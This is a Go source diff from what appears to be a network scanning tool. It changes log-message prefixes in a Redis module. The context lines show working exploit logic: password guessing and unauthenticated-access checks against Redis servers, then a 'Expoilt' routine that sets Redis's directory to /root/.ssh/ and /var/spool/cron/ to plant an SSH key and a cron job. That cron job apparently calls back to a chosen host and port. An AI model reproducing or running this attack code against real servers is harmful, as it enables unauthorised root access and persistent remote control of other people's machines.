@@ -90,7 +90,7 @@ func RedisScan(info *Common.HostInfo) (tmperr error) {
 
 					// 处理错误情况
 					if err != nil {
-						errlog := fmt.Sprintf("[-] Redis %v:%v %v %v",
+						errlog := fmt.Sprintf("Redis %v:%v %v %v",
 							info.Host, info.Ports, pass, err)
 						Common.LogError(errlog)
 
@@ -126,7 +126,7 @@ func RedisScan(info *Common.HostInfo) (tmperr error) {
 			}
 		}
 	}
-	
+
 	return tmperr
 }
 
@@ -162,12 +162,12 @@ func RedisConn(info *Common.HostInfo, pass string) (bool, error) {
 		// 获取配置信息
 		dbfilename, dir, err = getconfig(conn)
 		if err != nil {
-			result := fmt.Sprintf("[+] Redis %s %s", realhost, pass)
+			result := fmt.Sprintf("Redis %s %s", realhost, pass)
 			Common.LogSuccess(result)
 			return true, err
 		}
 
-		result := fmt.Sprintf("[+] Redis %s %s file:%s/%s", realhost, pass, dir, dbfilename)
+		result := fmt.Sprintf("Redis %s %s file:%s/%s", realhost, pass, dir, dbfilename)
 		Common.LogSuccess(result)
 
 		// 尝试利用
@@ -186,28 +186,28 @@ func RedisUnauth(info *Common.HostInfo) (flag bool, err error) {
 	// 建立TCP连接
 	conn, err := Common.WrapperTcpWithTimeout("tcp", realhost, time.Duration(Common.Timeout)*time.Second)
 	if err != nil {
-		Common.LogError(fmt.Sprintf("[-] Redis连接失败 %s: %v", realhost, err))
+		Common.LogError(fmt.Sprintf("Redis连接失败 %s: %v", realhost, err))
 		return flag, err
 	}
 	defer conn.Close()
 
 	// 设置读取超时
 	if err = conn.SetReadDeadline(time.Now().Add(time.Duration(Common.Timeout) * time.Second)); err != nil {
-		Common.LogError(fmt.Sprintf("[-] Redis %s 设置超时失败: %v", realhost, err))
+		Common.LogError(fmt.Sprintf("Redis %s 设置超时失败: %v", realhost, err))
 		return flag, err
 	}
 
 	// 发送info命令测试未授权访问
 	_, err = conn.Write([]byte("info\r\n"))
 	if err != nil {
-		Common.LogError(fmt.Sprintf("[-] Redis %s 发送命令失败: %v", realhost, err))
+		Common.LogError(fmt.Sprintf("Redis %s 发送命令失败: %v", realhost, err))
 		return flag, err
 	}
 
 	// 读取响应
 	reply, err := readreply(conn)
 	if err != nil {
-		Common.LogError(fmt.Sprintf("[-] Redis %s 读取响应失败: %v", realhost, err))
+		Common.LogError(fmt.Sprintf("Redis %s 读取响应失败: %v", realhost, err))
 		return flag, err
 	}
 
@@ -217,19 +217,19 @@ func RedisUnauth(info *Common.HostInfo) (flag bool, err error) {
 		// 获取Redis配置信息
 		dbfilename, dir, err = getconfig(conn)
 		if err != nil {
-			result := fmt.Sprintf("[+] Redis %s 发现未授权访问", realhost)
+			result := fmt.Sprintf("Redis %s 发现未授权访问", realhost)
 			Common.LogSuccess(result)
 			return flag, err
 		}
 
 		// 输出详细信息
-		result := fmt.Sprintf("[+] Redis %s 发现未授权访问 文件位置:%s/%s", realhost, dir, dbfilename)
+		result := fmt.Sprintf("Redis %s 发现未授权访问 文件位置:%s/%s", realhost, dir, dbfilename)
 		Common.LogSuccess(result)
 
 		// 尝试漏洞利用
 		err = Expoilt(realhost, conn)
 		if err != nil {
-			Common.LogError(fmt.Sprintf("[-] Redis %s 漏洞利用失败: %v", realhost, err))
+			Common.LogError(fmt.Sprintf("Redis %s 漏洞利用失败: %v", realhost, err))
 		}
 	}
 
@@ -246,53 +246,53 @@ func Expoilt(realhost string, conn net.Conn) error {
 	// 测试目录写入权限
 	flagSsh, flagCron, err := testwrite(conn)
 	if err != nil {
-		Common.LogError(fmt.Sprintf("[-] Redis %v 测试写入权限失败: %v", realhost, err))
+		Common.LogError(fmt.Sprintf("Redis %v 测试写入权限失败: %v", realhost, err))
 		return err
 	}
 
 	// SSH密钥写入测试
 	if flagSsh {
-		Common.LogSuccess(fmt.Sprintf("[+] Redis %v 可写入路径 /root/.ssh/", realhost))
+		Common.LogSuccess(fmt.Sprintf("Redis %v 可写入路径 /root/.ssh/", realhost))
 
 		// 如果指定了密钥文件则尝试写入
 		if Common.RedisFile != "" {
 			writeok, text, err := writekey(conn, Common.RedisFile)
 			if err != nil {
-				Common.LogError(fmt.Sprintf("[-] Redis %v SSH密钥写入错误: %v %v", realhost, text, err))
+				Common.LogError(fmt.Sprintf("Redis %v SSH密钥写入错误: %v %v", realhost, text, err))
 				return err
 			}
 
 			if writeok {
-				Common.LogSuccess(fmt.Sprintf("[+] Redis %v SSH公钥写入成功", realhost))
+				Common.LogSuccess(fmt.Sprintf("Redis %v SSH公钥写入成功", realhost))
 			} else {
-				Common.LogError(fmt.Sprintf("[-] Redis %v SSH公钥写入失败: %v", realhost, text))
+				Common.LogError(fmt.Sprintf("Redis %v SSH公钥写入失败: %v", realhost, text))
 			}
 		}
 	}
 
 	// 定时任务写入测试
 	if flagCron {
-		Common.LogSuccess(fmt.Sprintf("[+] Redis %v 可写入路径 /var/spool/cron/", realhost))
+		Common.LogSuccess(fmt.Sprintf("Redis %v 可写入路径 /var/spool/cron/", realhost))
 
 		// 如果指定了shell命令则尝试写入定时任务
 		if Common.RedisShell != "" {
 			writeok, text, err := writecron(conn, Common.RedisShell)
 			if err != nil {
-				Common.LogError(fmt.Sprintf("[-] Redis %v 定时任务写入错误: %v", realhost, err))
+				Common.LogError(fmt.Sprintf("Redis %v 定时任务写入错误: %v", realhost, err))
 				return err
 			}
 
 			if writeok {
-				Common.LogSuccess(fmt.Sprintf("[+] Redis %v 成功写入 /var/spool/cron/root", realhost))
+				Common.LogSuccess(fmt.Sprintf("Redis %v 成功写入 /var/spool/cron/root", realhost))
 			} else {
-				Common.LogError(fmt.Sprintf("[-] Redis %v 定时任务写入失败: %v", realhost, text))
+				Common.LogError(fmt.Sprintf("Redis %v 定时任务写入失败: %v", realhost, text))
 			}
 		}
 	}
 
 	// 恢复数据库配置
 	if err = recoverdb(dbfilename, dir, conn); err != nil {
-		Common.LogError(fmt.Sprintf("[-] Redis %v 恢复数据库失败: %v", realhost, err))
+		Common.LogError(fmt.Sprintf("Redis %v 恢复数据库失败: %v", realhost, err))
 	}
 
 	return err
@@ -328,11 +328,11 @@ func writekey(conn net.Conn, filename string) (flag bool, text string, err error
 			// 读取密钥文件
 			key, err := Readfile(filename)
 			if err != nil {
-				text = fmt.Sprintf("[-] 读取密钥文件 %s 失败: %v", filename, err)
+				text = fmt.Sprintf("读取密钥文件 %s 失败: %v", filename, err)
 				return flag, text, err
 			}
 			if len(key) == 0 {
-				text = fmt.Sprintf("[-] 密钥文件 %s 为空", filename)
+				text = fmt.Sprintf("密钥文件 %s 为空", filename)
 				return flag, text, err
 			}
 
@@ -414,7 +414,7 @@ func writecron(conn net.Conn, host string) (flag bool, text string, err error) {
 			// 解析目标主机地址
 			target := strings.Split(host, ":")
 			if len(target) < 2 {
-				return flag, "[-] 主机地址格式错误", err
+				return flag, "主机地址格式错误", err
 			}
 			scanIp, scanPort := target[0], target[1]
 
@@ -495,40 +495,40 @@ func testwrite(conn net.Conn) (flag bool, flagCron bool, err error) {
 	fmt.Println("[*] 正在测试 /root/.ssh/ 目录写入权限...")
 	_, err = conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n"))
 	if err != nil {
-		fmt.Printf("[-] 发送SSH目录测试命令失败: %v\n", err)
+		fmt.Printf("发送SSH目录测试命令失败: %v\n", err)
 		return flag, flagCron, err
 	}
 	text, err := readreply(conn)
 	if err != nil {
-		fmt.Printf("[-] 读取SSH目录测试响应失败: %v\n", err)
+		fmt.Printf("读取SSH目录测试响应失败: %v\n", err)
 		return flag, flagCron, err
 	}
 	fmt.Printf("[*] SSH目录测试响应: %s\n", text)
 	if strings.Contains(text, "OK") {
 		flag = true
-		fmt.Println("[+] SSH目录写入权限测试成功")
+		fmt.Println("SSH目录写入权限测试成功")
 	} else {
-		fmt.Println("[-] SSH目录写入权限测试失败")
+		fmt.Println("SSH目录写入权限测试失败")
 	}
 
 	// 测试定时任务目录写入权限
 	fmt.Println("[*] 正在测试 /var/spool/cron/ 目录写入权限...")
 	_, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/\r\n"))
 	if err != nil {
-		fmt.Printf("[-] 发送定时任务目录测试命令失败: %v\n", err)
+		fmt.Printf("发送定时任务目录测试命令失败: %v\n", err)
 		return flag, flagCron, err
 	}
 	text, err = readreply(conn)
 	if err != nil {
-		fmt.Printf("[-] 读取定时任务目录测试响应失败: %v\n", err)
+		fmt.Printf("读取定时任务目录测试响应失败: %v\n", err)
 		return flag, flagCron, err
 	}
 	fmt.Printf("[*] 定时任务目录测试响应: %s\n", text)
 	if strings.Contains(text, "OK") {
 		flagCron = true
-		fmt.Println("[+] 定时任务目录写入权限测试成功")
+		fmt.Println("定时任务目录写入权限测试成功")
 	} else {
-		fmt.Println("[-] 定时任务目录写入权限测试失败")
+		fmt.Println("定时任务目录写入权限测试失败")
 	}
 
 	fmt.Printf("[*] 写入权限测试完成 - SSH权限: %v, Cron权限: %v\n", flag, flagCron)
